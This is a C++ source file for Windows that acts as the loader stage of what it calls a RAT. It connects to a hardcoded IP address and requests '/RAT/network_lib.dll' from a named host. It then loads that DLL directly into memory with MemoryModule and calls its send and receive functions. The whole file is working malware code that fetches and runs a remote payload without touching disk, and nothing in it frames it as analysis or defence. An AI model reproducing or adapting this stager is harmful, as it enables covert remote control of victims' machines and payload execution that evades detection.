//cl /EHsc .\ld_dll_frm_mem.cpp .\MemoryModule.c /link ws2_32.lib user32.lib kernel32.lib /OUT:ld_dll_frm_mem.exe
#include <ws2tcpip.h>
#include <winsock2.h>
#include <windows.h>
#include <iostream>
#include <string>
#include <mutex>
#include <sstream>
#include <vector>
#include <algorithm>
#include <psapi.h>
#include <fstream>
#include <tlhelp32.h>
#include "MemoryModule.h"

using namespace std;
#pragma comment(lib, "ws2_32.lib")

SOCKET sock;
std::mutex socketMutex;

void safe_closesocket(SOCKET &clientSocket);
bool socket_setup(SOCKET &clientSocket);

void send_data(SOCKET &clientSocket, const string &filename ,const string &data);
vector<unsigned char> receive_data(SOCKET &clientSocket, const string &filename);

typedef int (*SendDataFunc)(const std::string&, const std::string&);
typedef string (*RecvDataFunc)(const std::string&);
typedef vector<unsigned char> (*RecvDataRawFunc)(const std::string&);

SendDataFunc send_data_dll;
RecvDataFunc receive_data_dll;
RecvDataRawFunc receive_data_raw_dll;

int main()
{
    if (!socket_setup(sock))
    {
        cerr << "Socket setup failed." << endl;
        return 1;
    }

    vector<unsigned char> data;

    data = receive_data(sock, "network_lib.dll");

    HMEMORYMODULE hModule = MemoryLoadLibrary(data.data(), data.size());
    if (hModule == NULL)
    {
        std::cerr << "Failed to load DLL from memory.\n";
        return 1;
    }
    std::cout << "DLL loaded from memory successfully.\n";

    receive_data_raw_dll = (RecvDataRawFunc)MemoryGetProcAddress(hModule, "?receive_data_raw@@YA?AV?$vector@EV?$allocator@E@std@@@std@@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@@Z");
    receive_data_dll = (RecvDataFunc)MemoryGetProcAddress(hModule, "?receive_data@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEBV12@@Z");
    send_data_dll = (SendDataFunc)MemoryGetProcAddress(hModule, "?send_data@@YAHAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z");

    if (!receive_data_dll || !send_data_dll || !receive_data_raw_dll)
    {
        std::cerr << "Failed to get one or more function addresses.\n";
        MemoryFreeLibrary(hModule);
        return 1;
    }

    send_data_dll("12345678910.txt","HOLA AMIGOO");
    Sleep(100);
    cout << receive_data_dll("12345678910.txt")  << "\n" ;
    Sleep(100);
    auto raw_data = receive_data_raw_dll("12345678910.txt");
    for (unsigned char byte : raw_data) cout << std::hex << static_cast<int>(byte) << " ";

    MemoryFreeLibrary(hModule);
    cout << "\nDLL unloaded from memory.\n";

    return 0;
}


bool socket_setup(SOCKET &clientSocket)
{
    bool connected = false;

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        std::cerr << "WSAStartup failed.\n";
        return false;
    }

    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (clientSocket == INVALID_SOCKET)
    {
        std::cerr << "socket failed.\n";
        WSACleanup();
        return false;
    }

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(80);
    serverAddr.sin_addr.s_addr = inet_addr("103.92.235.21");

    connected = false;
    while (!connected)
    {
        if (connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
        {
            int error = WSAGetLastError();
            if (error != WSAECONNREFUSED)
            {
                std::stringstream ss;
                ss << "Connection failed with error: " << error << " (" << gai_strerror(error) << "). Retrying in 2 seconds...\n";
                std::cerr << ss.str();
            }   
            else std::cerr << "Connection refused. Retrying in 2 seconds...\n";
            Sleep(2000);
        }
        else
        {
            //std::cout << "Connected to the server!\n";
            connected = true;
        }
    }
    return true;
}

void safe_closesocket(SOCKET &clientSocket)
{
    if (clientSocket != INVALID_SOCKET)
    {
        shutdown(clientSocket, SD_BOTH);
        closesocket(clientSocket);
        
        clientSocket = INVALID_SOCKET;
    }
}

vector<unsigned char> receive_data(SOCKET &clientSocket, const string &filename)
{
    lock_guard<mutex> lock1(socketMutex);

    socket_setup(clientSocket);

    // Send HTTP GET request
    string httpRequest = "GET /RAT/" + filename + " HTTP/1.1\r\n";
    httpRequest += "Host: arth.imbeddex.com\r\n";
    httpRequest += "Connection: close\r\n\r\n";

    int bytesSent = send(clientSocket, httpRequest.c_str(), httpRequest.length(), 0);
    if (bytesSent == SOCKET_ERROR)
    {
        int error = WSAGetLastError();
        cerr << "Send failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
        throw std::runtime_error("Send failed");
    }

    // Receive data in chunks
    char buffer[8192]; // Increased buffer size
    vector<unsigned char> receivedData;
    int bytesReceived;

    do {
        bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);
        if (bytesReceived > 0) {
            receivedData.insert(receivedData.end(), buffer, buffer + bytesReceived);
        } else if (bytesReceived == 0) {
            //cerr << "Connection closed by server." << endl;
            break;
        } else {
            int error = WSAGetLastError();
            cerr << "Receive failed with error: " << error << endl;
            break;
        }
    } while (bytesReceived > 0);

    // Ensure header separator is found
    size_t headerEnd = 0;
    const unsigned char CRLF[] = {0x0D, 0x0A, 0x0D, 0x0A};

    // Search for header separator (CRLF + CRLF)
    for (size_t i = 0; i < receivedData.size() - 3; ++i)
    {
        if (receivedData[i] == CRLF[0] &&
            receivedData[i + 1] == CRLF[1] &&
            receivedData[i + 2] == CRLF[2] &&
            receivedData[i + 3] == CRLF[3])
        {
            headerEnd = i + 4; // Found header, skip the separator
            break;
        }
    }

    if (headerEnd != 0)
    {
        //cout << "Header found at position: " << headerEnd << endl;
    }
    else
    {
        cerr << "Header separator not found." << endl;
        throw std::runtime_error("Header separator not found");
    }

    // Make sure headerEnd + 4 is within the bounds of the receivedData
    if (headerEnd < receivedData.size())
    {
        // Extract body after header (start from headerEnd)
        vector<unsigned char> body(receivedData.begin() + headerEnd, receivedData.end());
        safe_closesocket(clientSocket); // Close the socket safely

        return body; // Return the extracted body
    }
    else
    {
        cerr << "Body extraction failed: headerEnd exceeds receivedData size." << endl;
        safe_closesocket(clientSocket); // Close the socket safely
        throw std::runtime_error("Body extraction failed");
    }
}